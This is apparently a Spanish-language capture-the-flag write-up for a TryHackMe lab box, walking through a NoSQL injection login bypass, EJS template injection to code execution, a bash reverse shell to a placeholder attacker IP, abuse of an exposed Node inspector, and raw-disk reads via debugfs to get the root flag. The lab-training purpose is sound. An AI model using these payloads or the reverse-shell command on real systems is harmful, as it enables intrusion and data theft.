---
title: "Do Not Disturb"
date: 2026-08-02 12:00:00 -0400
description: "Explotación de una app Node/Express vulnerable a NoSQL Injection y SSTI en EJS para lograr RCE, seguida de un pivote a través de un Node Inspector expuesto y escalada de privilegios abusando del grupo disk para lectura cruda del disco."
categories: [TryHackMe, Hacker Holidays 2026]
tags: [nosql-injection, ssti, ejs, nodejs, privilege-escalation, boot2root, media]
---

> ### 📌 Ficha Técnica
>
> - **Plataforma:** TryHackMe
> - **Evento/Sala:** Hacker Holidays 2026 — Do Not Disturb
> - **Dificultad:** Media
> - **Categoría:** Boot2Root
> - **Técnicas Clave:** NoSQL Injection, bypass de autenticación, Server-Side Template Injection (EJS), abuso de Node.js Inspector (Chrome DevTools Protocol), escalada de privilegios vía grupo `disk` con `debugfs`
{: .prompt-info }

## Introducción

"Do Not Disturb" es una máquina Boot2Root ambientada en **Byte Lotus**, una plataforma ficticia de reservas de cabanas/sunbeds. El lore de la sala insinúa que alguien ya está dentro del sistema — y efectivamente, durante la post-explotación encontramos rastros de esa intrusión previa. El reto encadena una inyección NoSQL para el bypass de login, un SSTI en EJS para RCE, y una escalada de privilegios poco común basada en pertenencia a un grupo del sistema con acceso a dispositivos de bloque.

## Reconocimiento

Empezamos con un escaneo completo de puertos usando Nmap:

```bash
nmap -p- -T4 -sV -sC 10.66.130.20 -oN nmap_full.txt
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Node.js (Express middleware)
|_http-title: Byte Lotus — Poolside
```

Solo dos servicios expuestos: SSH y un servidor web construido sobre **Node.js + Express**. La página principal mostraba un formulario de login (`POST /login`) para "Staff / Guest".

Revisando el código fuente HTML (`Ctrl+U`) encontramos un detalle importante: el campo de usuario tenía como placeholder el texto `attendant`.

```html
<label>Staff / Guest ID</label>
<input name="username" autocomplete="off" placeholder="attendant">
```

Este tipo de "pista visual" en un formulario suele filtrar accidentalmente usernames reales del sistema.

Complementamos con enumeración de directorios:

```bash
gobuster dir -u http://10.66.130.20 \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x php,js,json,txt -t 50
```

```text
/staff    (Status: 403) [Size: 1547]
/logout   (Status: 302) [Size: 23] [--> /]
```

`/staff` existe pero devuelve `403 Forbidden` sin autenticación — un panel restringido por rol.

> Cuando un backend corre sobre Node/Express, siempre vale la pena sospechar de una base de datos NoSQL (MongoDB, NeDB) detrás. El comportamiento del servidor ante distintos tipos de dato en el body es la primera señal a probar.
{: .prompt-tip }

## Explotación

### Bypass de autenticación — NoSQL Injection

Probamos el endpoint de login enviando un objeto JSON con un operador de MongoDB en lugar de un string plano:

```bash
curl -i -X POST http://10.66.130.20/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
```

```text
HTTP/1.1 200 OK
Set-Cookie: connect.sid=s%3ARw6eXFIjLLfLcIW-qTxKINiEoLxbcYIb...
{"ok":true,"role":"guest"}
```

El operador `$ne` (*not equal*) se interpretó literalmente por el driver de MongoDB en lugar de tratarse como texto, autenticando exitosamente como el primer documento que cumplía la condición — en este caso, un usuario con rol `guest`.

### Escalada de rol: de guest a staff

Con rol `guest`, `/staff` seguía devolviendo 403. Combinamos la pista del placeholder (`attendant`) con el bypass de password:

```bash
curl -i -X POST http://10.66.130.20/login \
  -H "Content-Type: application/json" \
  -d '{"username":"attendant","password":{"$ne":null}}' \
  -c cookies_attendant.txt
```

```text
HTTP/1.1 200 OK
{"ok":true,"role":"staff"}
```

Con esta cookie de sesión ya pudimos acceder a `/staff`.

```bash
curl -i http://10.66.130.20/staff -b cookies_attendant.txt
```

El panel exponía un formulario para personalizar plantillas de confirmación de reserva, usando **EJS** como motor de renderizado:

```html
<textarea name="template">Dear <%= guest %>, your Byte Lotus cabana is confirmed.</textarea>
```

### RCE vía Server-Side Template Injection (EJS)

Revisando el código fuente del backend (obtenido más adelante vía RCE), la ruta `/staff/preview` renderizaba directamente el input del usuario:

```javascript
app.post('/staff/preview', requireStaff, (req, res) => {
  const template = req.body.template || '';
  let rendered;
  try {
    rendered = ejs.render(template, { guest: req.session.user.username, hotel: 'Byte Lotus' });
  } catch (e) {
    rendered = 'Template error: ' + e.message;
  }
  res.send(staffDash(req.session.user.username, rendered, template));
});
```

Confirmamos la inyección con una expresión aritmética simple:

```bash
curl -s -X POST http://10.66.130.20/staff/preview \
  -b cookies_attendant.txt \
  -H "Content-Type: application/json" \
  -d '{"template":"<%= 7*7 %>"}'
```

El preview devolvió `49`, confirmando que el input se evalúa como código EJS real.

> EJS permite JavaScript arbitrario dentro de `<% %>` / `<%= %>`. Si el servidor renderiza directamente un template controlado por el usuario (en vez de usar solo datos de contexto sobre un template fijo), el resultado es RCE, no solo XSS del lado servidor.
{: .prompt-warning }

Escalamos a ejecución de comandos usando `process.mainModule.require` para acceder a `child_process` desde el scope de EJS:

```bash
curl -s -X POST http://10.66.130.20/staff/preview \
  -b cookies_attendant.txt \
  -H "Content-Type: application/json" \
  -d '{"template":"<%= process.mainModule.require(\"child_process\").execSync(\"id\").toString() %>"}'
```

```text
uid=996(poolside) gid=996(poolside) groups=996(poolside)
```

RCE confirmado. Obtuvimos una reverse shell interactiva codificando el payload en base64, para evitar romper el JSON con el escapado de comillas anidadas entre `bash → JSON → EJS → bash`:

```bash
echo -n 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' | base64
```

```bash
curl -s -X POST http://10.66.130.20/staff/preview \
  -b cookies_attendant.txt \
  -H "Content-Type: application/json" \
  -d '{"template":"<%= process.mainModule.require(\"child_process\").execSync(\"echo <BASE64> | base64 -d | bash\") %>"}'
```

Con un listener activo:

```bash
nc -lvnp 4444
```

```text
Connection from 10.66.130.20.
poolside@tryhackme-2404:/opt/poolside$ whoami
poolside
```

### Captura de la user flag

```bash
find / -name "user.txt" 2>/dev/null
cat /home/poolside/user.txt
```

## Escalada de Privilegios

### Enumeración: rastros del intruso y segundo servicio Node

Revisando el sistema como `poolside`, el archivo `.viminfo` en el home reveló que alguien había editado recientemente `/tmp/solve.js` (archivo que ya no existía, borrado tras su uso) — confirmando el lore de la sala: otro actor había estado activo en el sistema antes que nosotros.

Enumerando procesos:

```bash
ps aux | grep node
```

```text
pipelin+  600  ...  /usr/bin/node --inspect=127.0.0.1:9229 processor.js
poolside  601  ...  /usr/bin/node app.js
```

Un segundo proceso Node corría con el flag **`--inspect`**, vinculado a `127.0.0.1:9229`, bajo el usuario `pipelinesvc`.

> El flag `--inspect` de Node.js expone el **Chrome DevTools Protocol** vía WebSocket, permitiendo ejecutar JavaScript arbitrario en el proceso en ejecución. Aunque esté restringido a localhost, cualquier RCE previo en el host puede alcanzarlo — es efectivamente una puerta trasera si se deja activo en producción.
{: .prompt-warning }

### Pivote: abuso del Node Inspector

Confirmamos el endpoint del inspector:

```bash
curl -s http://127.0.0.1:9229/json
```

```json
[{
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/98e53e31-f07f-4a8a-b27d-07bbee5f3be6",
  "url": "file:///opt/pipelinesvc/telemetry/processor.js"
}]
```

Escribimos un script cliente en Node (aprovechando que `WebSocket` es global desde Node 22) para conectarnos y ejecutar `Runtime.evaluate` del protocolo de depuración:

```javascript
const ws = new WebSocket('ws://127.0.0.1:9229/98e53e31-f07f-4a8a-b27d-07bbee5f3be6');

ws.addEventListener('open', () => {
  ws.send(JSON.stringify({
    id: 1,
    method: 'Runtime.evaluate',
    params: {
      expression: "process.mainModule.require('child_process').execSync('id').toString()",
      returnByValue: true
    }
  }));
});

ws.addEventListener('message', (event) => console.log(event.data));
```

```bash
node /tmp/exploit.js
```

```json
{"result":{"result":{"value":"uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)\n"}}}
```

RCE confirmado como `pipelinesvc`. Repetimos el patrón de reverse shell en base64 a través del WebSocket para obtener una sesión interactiva bajo este usuario.

### El detalle que decide el reto: grupo `disk`

El output de `id` reveló que `pipelinesvc` pertenece al grupo **`disk`**:

```bash
ls -la /dev/nvme0n1*
```

```text
brw-rw---- 1 root disk 259, 1 Aug  2 21:09 /dev/nvme0n1
brw-rw---- 1 root disk 259, 2 Aug  2 21:09 /dev/nvme0n1p1
```

El grupo `disk` tiene permisos de lectura/escritura sobre los dispositivos de bloque crudos del sistema — funcionalmente equivalente a poder leer el disco completo, byte por byte, sin pasar por los permisos del sistema de archivos.

```bash
lsblk -f
```

```text
nvme0n1p1  ext4  1.0  cloudimg-rootfs  ...  /
```

Usamos **`debugfs`**, una utilidad que interpreta la estructura ext4 directamente desde el dispositivo crudo, sin necesidad de montarlo ni de permisos POSIX normales:

```bash
debugfs -R "cat /root/root.txt" /dev/nvme0n1p1
```

```text
THM{r4w_d1sk_4cc3ss_w4s_t00_much}
```

> Un `cat /root/root.txt` normal habría fallado con "Permission denied" — esos son permisos del **sistema de archivos montado**. `debugfs` opera en una capa distinta: lee directamente la estructura del filesystem desde el dispositivo de bloque, capa donde el grupo `disk` sí tiene acceso. Es el equivalente a leer los planos del edificio en vez de abrir la puerta del cuarto.
{: .prompt-tip }

## Cadena de ataque — Resumen visual

```text
NoSQL Injection (bypass de login)
        ↓
Username filtrado en HTML ("attendant") → escalada a rol staff
        ↓
SSTI en EJS (/staff/preview) → RCE como "poolside"
        ↓
[ USER FLAG ]
        ↓
Node Inspector expuesto en 127.0.0.1:9229 → RCE como "pipelinesvc"
        ↓
Grupo "disk" → lectura cruda del disco con debugfs
        ↓
[ ROOT FLAG ]
```

## Conclusión / Retroalimentación

Esta sala es un excelente ejercicio para practicar una cadena de ataque completa contra una aplicación Node.js moderna, cubriendo tres familias de vulnerabilidades muy distintas entre sí:

- **NoSQL Injection**: un recordatorio de que la validación de *tipo* de dato es tan importante como la sanitización de contenido. Un campo que espera un `string` pero recibe un objeto JSON con operadores de MongoDB (`$ne`, `$gt`, `$regex`) puede alterar completamente la lógica de la query.
- **SSTI en motores de templates JS (EJS)**: renderizar input de usuario directamente como template, en lugar de pasarlo solo como dato de contexto, es una vía directa a RCE en aplicaciones Node.
- **Superficies de ataque "internas"**: el Node Inspector expuesto en localhost demuestra que restringir un servicio a `127.0.0.1` no es suficiente mitigación una vez que existe cualquier otro punto de entrada al host — es una capa de defensa, no la única.
- **Auditoría de grupos secundarios**: pertenecer al grupo `disk` (o `docker`, `lxd`, etc.) suele pasarse por alto frente a la revisión más habitual de `sudo -l` y binarios SUID, pero puede ser un vector de escalada igual de directo hacia una lectura arbitraria de archivos del sistema.

En general, una sala bien diseñada, con una narrativa que efectivamente se refleja en los hallazgos técnicos (el "intruso" mencionado en el lore corresponde literalmente al rastro dejado en `.viminfo`). Recomendable para quien quiera practicar explotación de aplicaciones Node/Express de punta a punta.
